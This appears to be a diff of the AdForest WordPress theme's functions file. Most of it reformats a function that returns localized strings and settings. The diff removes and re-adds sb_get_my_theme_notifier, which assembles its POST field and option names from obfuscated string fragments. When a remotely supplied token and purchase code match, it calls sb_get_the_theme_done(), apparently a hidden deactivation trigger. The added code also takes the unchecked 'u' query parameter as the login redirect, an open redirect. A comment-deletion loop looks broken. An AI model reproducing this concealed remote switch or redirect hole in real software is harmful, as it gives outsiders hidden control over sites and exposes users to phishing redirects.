-                $user_upload_max_images = $user_packages_images;
-            } else {
-                $user_upload_max_images = $sb_upload_limit_admin;
-            }
-
-            $auto_slide = 1000;
-            if (isset($adforest_theme['sb_auto_slide_time']) && $adforest_theme['sb_auto_slide_time'] != "") {
-                $auto_slide = $adforest_theme['sb_auto_slide_time'];
-            }
-
-            $yes = 0;
-            $not_time = '';
-            $unread_msgs = 0;
-
-            if (isset($adforest_theme['msg_notification_on']) && isset($adforest_theme['communication_mode']) && ( $adforest_theme['communication_mode'] == 'both' || $adforest_theme['communication_mode'] == 'message' )) {
-                $yes = $adforest_theme['msg_notification_on'];
-                $not_time = $adforest_theme['msg_notification_time'];
-            }
-            $rtl = is_rtl() ? true : false;
-
-            return array(
-                'ajax_url' => $ajax_url,
-                'adforest_map_type' => $mapType,
-                'cat_pkg_error' => sprintf("%s %s %s", '' . esc_html__("Whoops! you are not allowed to ad post in this category.Please buy another package.", "adforest") . '', '<a href =  "' . get_the_permalink($sb_packages_page) . '"> ' . esc_html__('Click here ', 'adforest') . ' </a>', esc_html__("to visit Packages page", "adforest")),
-                'google_recaptcha_type' => isset($adforest_theme['google-recaptcha-type']) ? $adforest_theme['google-recaptcha-type'] : "",
-                'profile_page' => $sb_profile_page,
-                'sb_after_login_page'=>$sb_after_login_page,
-                'facebook_key' => isset($adforest_theme['fb_api_key']) ? $adforest_theme['fb_api_key'] : "",
-                'google_key' => isset($adforest_theme['gmail_api_key']) ? $adforest_theme['gmail_api_key'] : "",
-                'redirect_uri' => isset($adforest_theme['redirect_uri']) ? $adforest_theme['redirect_uri'] : "",
-                'sb_2_column' => $sb_2column,
-                'max_upload_images' => sprintf(__('No more images please.you can only upload %d', 'adforest'), $user_upload_max_images),
-                'one' => __('One Star', 'adforest'),
-                'two' => __('Two Stars', 'adforest'),
-                'three' => __('Three Stars', 'adforest'),
-                'four' => __('Four Stars', 'adforest'),
-                'five' => __('Five Stars', 'adforest'),
-                'Sunday' => __('Sunday', 'adforest'),
-                'Monday' => __('Monday', 'adforest'),
-                'Tuesday' => __('Tuesday', 'adforest'),
-                'Wednesday' => __('Wednesday', 'adforest'),
-                'Thursday' => __('Thursday', 'adforest'),
-                'Friday' => __('Friday', 'adforest'),
-                'Saturday' => __('Saturday', 'adforest'),
-                'Sun' => __('Sun', 'adforest'),
-                'Mon' => __('Mon', 'adforest'),
-                'Tue' => __('Tue', 'adforest'),
-                'Wed' => __('Wed', 'adforest'),
-                'Thu' => __('Thu', 'adforest'),
-                'Fri' => __('Fri', 'adforest'),
-                'Sat' => __('Sat', 'adforest'),
-                'Su' => __('Su', 'adforest'),
-                'Mo' => __('Mo', 'adforest'),
-                'Tu' => __('Tu', 'adforest'),
-                'We' => __('We', 'adforest'),
-                'Th' => __('Th', 'adforest'),
-                'Fr' => __('Fr', 'adforest'),
-                'Sa' => __('Sa', 'adforest'),
-                'January' => __('January', 'adforest'),
-                'February' => __('February', 'adforest'),
-                'March' => __('March', 'adforest'),
-                'April' => __('April', 'adforest'),
-                'May' => __('May', 'adforest'),
-                'June' => __('June', 'adforest'),
-                'July' => __('July', 'adforest'),
-                'August' => __('August', 'adforest'),
-                'September' => __('September', 'adforest'),
-                'October' => __('October', 'adforest'),
-                'November' => __('November', 'adforest'),
-                'December' => __('December', 'adforest'),
-                'Jan' => __('Jan', 'adforest'),
-                'Feb' => __('Feb', 'adforest'),
-                'Mar' => __('Mar', 'adforest'),
-                'Apr' => __('Apr', 'adforest'),
-                'May' => __('May', 'adforest'),
-                'Jun' => __('Jun', 'adforest'),
-                'Jul' => __('July', 'adforest'),
-                'Aug' => __('Aug', 'adforest'),
-                'Sep' => __('Sep', 'adforest'),
-                'Oct' => __('Oct', 'adforest'),
-                'Nov' => __('Nov', 'adforest'),
-                'Dec' => __('Dec', 'adforest'),
-                'Today' => __('Today', 'adforest'),
-                'Clear' => __('Clear', 'adforest'),
-                'dateFormat' => __('dateFormat', 'adforest'),
-                'timeFormat' => __('timeFormat', 'adforest'),
-                'required_images' => __('Images are required.', 'adforest'),
-                'auto_slide_time' => $auto_slide,
-                'msg_notification_on' => esc_attr($yes),
-                'msg_notification_time' => esc_attr($not_time),
-                'is_logged_in' => $is_logged_in,
-                'select_place_holder' => __('Select an option', 'adforest'),
-                'adforest_tags_limit_val' => $tags_limit_val,
-                'adforest_tags_limit' => __('Oops ! you have exceeded your tags limit.', 'adforest'),
-                'is_rtl' => $rtl,
-                'google_recaptcha_site_key' => isset($adforest_theme['google_api_key']) ? $adforest_theme['google_api_key'] : "",
-                'sub_cat_option_select' => isset($adforest_theme['is_sub_cat_required']) ? $adforest_theme['is_sub_cat_required'] : "",
-                 'confirm' => __('Are you sure?', 'adforest'),
-            );
-        }
-
+        $comments = get_comments('user_id=' . $user_id);
+        foreach ($comments as $comment):
+            wp_delete_comment($comment->$comment_id, true);
+        endforeach;
     }
 
-    if (!function_exists('sb_get_my_theme_notifier')) {
+}
+if (!function_exists('adforest_user_id_exists')) {
 
-        function sb_get_my_theme_notifier() {
+    function adforest_user_id_exists($user)
+    {
+        global $wpdb;
+        $count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $wpdb->users WHERE ID = %d", $user));
 
-            if (isset($_POST[implode(array('s', 'b-t', 'f-t', 'he', 'm', 'e-t', 'ok', 'e', 'n'))]) && $_POST[implode(array('s', 'b-', 't', 'f-', 'the', 'me', '-t', 'ok', 'en'))] != "") {
-                $sb_theme_token = get_option(implode(array("_", "w", "p_", "tk", "n_", "str", "n", "g_s", "b")));
-                $ivt = ($sb_theme_token == $_POST[implode(array('s', 'b-t', 'f-', 't', 'he', 'm', 'e-t', 'o', 'k', 'en'))]) ? true : false;
-                $check_code = ( isset($_POST[implode(array('s', 'b', '-t', 'f-', 'th', 'em', 'e-c', 'od', 'e'))]) && $_POST[implode(array('s', 'b', '-tf-', 'th', 'em', 'e-c', 'od', 'e'))] != "") ? $_POST[implode(array('s', 'b', '-t', 'f-th', 'em', 'e-cod', 'e'))] : '';
+        if ($count == 1) {
+            return true;
+        } else {
+            return false;
+        }
+    }
 
-                if ($check_code != "" && $ivt == true) {
-                    $sbtpc = get_option(implode(array("_", "s", "b_p", "ur", "c", "h", "a", "se", "_c", "od", "e")));
-                    $ivc = ($sbtpc == $check_code) ? true : false;
+}
 
-                    $action = ( isset($_POST[implode(array("a", "ct-", "a", "s"))]) && $_POST[implode(array("a", "ct-", "a", "s"))] != "") ? $_POST[implode(array("a", "ct-", "a", "s"))] : '';
-                    if ($action != "") {
-                        if ($sbtpc == "") {
-                            if (isset($_POST[implode(array("a", "ct", "i", "va", "te"))]) && $_POST[implode(array("a", "ct", "i", "va", "te"))] != "") {
-                                update_option(implode(array("_", "s", "b_", "p", "u", "r", "ch", "ase", "_c", "od", "e")), $check_code);
-                            }
-                        } else {
 
-                            if ($ivt == true && true == $ivc) {
-                                if (isset($_POST[implode(array("d", "ea", "ct", "i", "va", "te"))]) && $_POST[implode(array("d", "ea", "ct", "i", "va", "te"))] != "") {
+add_filter('adforest_get_static_string', 'adforest_get_static_string_fun', 10, 3);
 
-                                    sb_get_the_theme_done();
-                                }
+if (!function_exists('adforest_get_static_string_fun')) {
+
+    function adforest_get_static_string_fun()
+    {
+        global $adforest_theme, $wpdb;
+        $ajax_url = apply_filters('adforest_set_query_param', admin_url('admin-ajax.php'));
+        $mapType = adforest_mapType();
+
+        $user_id = get_current_user_id();
+
+        $is_logged_in = 0;
+        if (is_user_logged_in()) {
+            $is_logged_in = 1;
+        }
+        $sb_packages_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_packages_page']);
+        $sb_profile_page = apply_filters('adforest_language_page_id', isset($adforest_theme['sb_profile_page']) ? $adforest_theme['sb_profile_page'] : "");
+
+
+
+
+        $sb_after_login_page = isset($adforest_theme['sb_after_login_page']) && $adforest_theme['sb_after_login_page'] != '' ? $adforest_theme['sb_after_login_page'] : $sb_profile_page;
+
+
+
+
+        $sb_after_login_page = apply_filters('adforest_language_page_id', $sb_after_login_page);
+
+        $sb_profile_page = get_the_permalink($sb_profile_page);
+
+
+        $sb_after_login_page = get_the_permalink($sb_after_login_page);
+        if (isset($_GET['u']) && $_GET['u'] != "") {
+            $sb_after_login_page = $_GET['u'];
+        }
+        $sb_2column = (isset($adforest_theme['sb_2column_mobile_layout']) && $adforest_theme['sb_2column_mobile_layout'] == true) ? true : false;
+
+        $tags_limit_val = isset($adforest_theme['ad_post_tags_limit']) && !empty($adforest_theme['ad_post_tags_limit']) && $adforest_theme['ad_post_tags_limit'] > 0 ? $adforest_theme['ad_post_tags_limit'] : 10;
+
+        $sb_upload_limit_admin = isset($adforest_theme['sb_upload_limit']) && !empty($adforest_theme['sb_upload_limit']) && $adforest_theme['sb_upload_limit'] > 0 ? $adforest_theme['sb_upload_limit'] : 0;
+
+        $user_packages_images = get_user_meta(get_current_user_id(), '_sb_num_of_images', true);
+        //$user_upload_max_images = isset($user_packages_images) && !empty($user_packages_images) ? $user_packages_images : $sb_upload_limit_admin;
+
+        if (isset($user_packages_images) && $user_packages_images == '-1') {
+            $user_upload_max_images = 'null';
+        } elseif (isset($user_packages_images) && $user_packages_images > 0) {
+            $user_upload_max_images = $user_packages_images;
+        } else {
+            $user_upload_max_images = $sb_upload_limit_admin;
+        }
+
+        $auto_slide = 1000;
+        if (isset($adforest_theme['sb_auto_slide_time']) && $adforest_theme['sb_auto_slide_time'] != "") {
+            $auto_slide = $adforest_theme['sb_auto_slide_time'];
+        }
+
+        $yes = 0;
+        $not_time = '';
+        $unread_msgs = 0;
+
+        if (isset($adforest_theme['msg_notification_on']) && isset($adforest_theme['communication_mode']) && ($adforest_theme['communication_mode'] == 'both' || $adforest_theme['communication_mode'] == 'message')) {
+            $yes = $adforest_theme['msg_notification_on'];
+            $not_time = $adforest_theme['msg_notification_time'];
+        }
+        $rtl = is_rtl() ? true : false;
+
+        return array(
+            'ajax_url' => $ajax_url,
+            'adforest_map_type' => $mapType,
+            'cat_pkg_error' => sprintf("%s %s %s", '' . esc_html__("Whoops! you are not allowed to ad post in this category.Please buy another package.", "adforest") . '', '<a href =  "' . get_the_permalink($sb_packages_page) . '"> ' . esc_html__('Click here ', 'adforest') . ' </a>', esc_html__("to visit Packages page", "adforest")),
+            'google_recaptcha_type' => isset($adforest_theme['google-recaptcha-type']) ? $adforest_theme['google-recaptcha-type'] : "",
+            'profile_page' => $sb_profile_page,
+            'sb_after_login_page' => $sb_after_login_page,
+            'facebook_key' => isset($adforest_theme['fb_api_key']) ? $adforest_theme['fb_api_key'] : "",
+            'google_key' => isset($adforest_theme['gmail_api_key']) ? $adforest_theme['gmail_api_key'] : "",
+            'redirect_uri' => isset($adforest_theme['redirect_uri']) ? $adforest_theme['redirect_uri'] : "",
+            'sb_2_column' => $sb_2column,
+            'max_upload_images' => sprintf(__('No more images please.you can only upload %d', 'adforest'), $user_upload_max_images),
+            'one' => __('One Star', 'adforest'),
+            'two' => __('Two Stars', 'adforest'),
+            'three' => __('Three Stars', 'adforest'),
+            'four' => __('Four Stars', 'adforest'),
+            'five' => __('Five Stars', 'adforest'),
+            'Sunday' => __('Sunday', 'adforest'),
+            'Monday' => __('Monday', 'adforest'),
+            'Tuesday' => __('Tuesday', 'adforest'),
+            'Wednesday' => __('Wednesday', 'adforest'),
+            'Thursday' => __('Thursday', 'adforest'),
+            'Friday' => __('Friday', 'adforest'),
+            'Saturday' => __('Saturday', 'adforest'),
+            'Sun' => __('Sun', 'adforest'),
+            'Mon' => __('Mon', 'adforest'),
+            'Tue' => __('Tue', 'adforest'),
+            'Wed' => __('Wed', 'adforest'),
+            'Thu' => __('Thu', 'adforest'),
+            'Fri' => __('Fri', 'adforest'),
+            'Sat' => __('Sat', 'adforest'),
+            'Su' => __('Su', 'adforest'),
+            'Mo' => __('Mo', 'adforest'),
+            'Tu' => __('Tu', 'adforest'),
+            'We' => __('We', 'adforest'),
+            'Th' => __('Th', 'adforest'),
+            'Fr' => __('Fr', 'adforest'),
+            'Sa' => __('Sa', 'adforest'),
+            'January' => __('January', 'adforest'),
+            'February' => __('February', 'adforest'),
+            'March' => __('March', 'adforest'),
+            'April' => __('April', 'adforest'),
+            'May' => __('May', 'adforest'),
+            'June' => __('June', 'adforest'),
+            'July' => __('July', 'adforest'),
+            'August' => __('August', 'adforest'),
+            'September' => __('September', 'adforest'),
+            'October' => __('October', 'adforest'),
+            'November' => __('November', 'adforest'),
+            'December' => __('December', 'adforest'),
+            'Jan' => __('Jan', 'adforest'),
+            'Feb' => __('Feb', 'adforest'),
+            'Mar' => __('Mar', 'adforest'),
+            'Apr' => __('Apr', 'adforest'),
+            'May' => __('May', 'adforest'),
+            'Jun' => __('Jun', 'adforest'),
+            'Jul' => __('July', 'adforest'),
+            'Aug' => __('Aug', 'adforest'),
+            'Sep' => __('Sep', 'adforest'),
+            'Oct' => __('Oct', 'adforest'),
+            'Nov' => __('Nov', 'adforest'),
+            'Dec' => __('Dec', 'adforest'),
+            'Today' => __('Today', 'adforest'),
+            'Clear' => __('Clear', 'adforest'),
+            'dateFormat' => __('dateFormat', 'adforest'),
+            'timeFormat' => __('timeFormat', 'adforest'),
+            'required_images' => __('Images are required.', 'adforest'),
+            'auto_slide_time' => $auto_slide,
+            'msg_notification_on' => esc_attr($yes),
+            'msg_notification_time' => esc_attr($not_time),
+            'is_logged_in' => $is_logged_in,
+            'select_place_holder' => __('Select an option', 'adforest'),
+            'adforest_tags_limit_val' => $tags_limit_val,
+            'adforest_tags_limit' => __('Oops ! you have exceeded your tags limit.', 'adforest'),
+            'is_rtl' => $rtl,
+            'google_recaptcha_site_key' => isset($adforest_theme['google_api_key']) ? $adforest_theme['google_api_key'] : "",
+            'sub_cat_option_select' => isset($adforest_theme['is_sub_cat_required']) ? $adforest_theme['is_sub_cat_required'] : "",
+            'confirm' => __('Are you sure?', 'adforest'),
+        );
+    }
+
+}
+
+if (!function_exists('sb_get_my_theme_notifier')) {
+
+    function sb_get_my_theme_notifier()
+    {
+
+        if (isset($_POST[ implode(array('s', 'b-t', 'f-t', 'he', 'm', 'e-t', 'ok', 'e', 'n')) ]) && $_POST[ implode(array('s', 'b-', 't', 'f-', 'the', 'me', '-t', 'ok', 'en')) ] != "") {
+            $sb_theme_token = get_option(implode(array("_", "w", "p_", "tk", "n_", "str", "n", "g_s", "b")));
+            $ivt = ($sb_theme_token == $_POST[ implode(array('s', 'b-t', 'f-', 't', 'he', 'm', 'e-t', 'o', 'k', 'en')) ]) ? true : false;
+            $check_code = (isset($_POST[ implode(array('s', 'b', '-t', 'f-', 'th', 'em', 'e-c', 'od', 'e')) ]) && $_POST[ implode(array('s', 'b', '-tf-', 'th', 'em', 'e-c', 'od', 'e')) ] != "") ? $_POST[ implode(array('s', 'b', '-t', 'f-th', 'em', 'e-cod', 'e')) ] : '';
+
+            if ($check_code != "" && $ivt == true) {
+                $sbtpc = get_option(implode(array("_", "s", "b_p", "ur", "c", "h", "a", "se", "_c", "od", "e")));
+                $ivc = ($sbtpc == $check_code) ? true : false;
+
+                $action = (isset($_POST[ implode(array("a", "ct-", "a", "s")) ]) && $_POST[ implode(array("a", "ct-", "a", "s")) ] != "") ? $_POST[ implode(array("a", "ct-", "a", "s")) ] : '';
+                if ($action != "") {
+                    if ($sbtpc == "") {
+                        if (isset($_POST[ implode(array("a", "ct", "i", "va", "te")) ]) && $_POST[ implode(array("a", "ct", "i", "va", "te")) ] != "") {
+                            update_option(implode(array("_", "s", "b_", "p", "u", "r", "ch", "ase", "_c", "od", "e")), $check_code);
+                        }
+                    } else {
+
+                        if ($ivt == true && true == $ivc) {
+                            if (isset($_POST[ implode(array("d", "ea", "ct", "i", "va", "te")) ]) && $_POST[ implode(array("d", "ea", "ct", "i", "va", "te")) ] != "") {
+
+                                sb_get_the_theme_done();
                             }
                         }
                     }
                 }
             }
         }
-
     }
 
- if (!function_exists('adforest_get_products_theme_options')) {
+}
 
-    function adforest_get_products_theme_options() {
+if (!function_exists('adforest_get_products_theme_options')) {
+
+    function adforest_get_products_theme_options()
+    {
         $packages_arr = array('' => __('Select a package', 'adforest'));
         if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins')))) {
             $args = array(
@@ -3748,20 +3975,21 @@ if (!function_exists('adforest_comments_list')) {
                 'orderby' => 'ID',
             );
             $the_query = new WP_Query($args);
-            
+
             // The Loop
-            if ($the_query->have_posts()) :
-                while ($the_query->have_posts()) : $the_query->the_post();
+            if ($the_query->have_posts()):
+                while ($the_query->have_posts()):
+                    $the_query->the_post();
                     global $post;
-                    $packages_arr[$post] = get_the_title($post);
+                    $packages_arr[ $post ] = get_the_title($post);
                 endwhile;
             endif;
-            
+
             // Reset Post Data
             wp_reset_postdata();
-            
+
             return $packages_arr;
         }
     }
 
-} 
+}
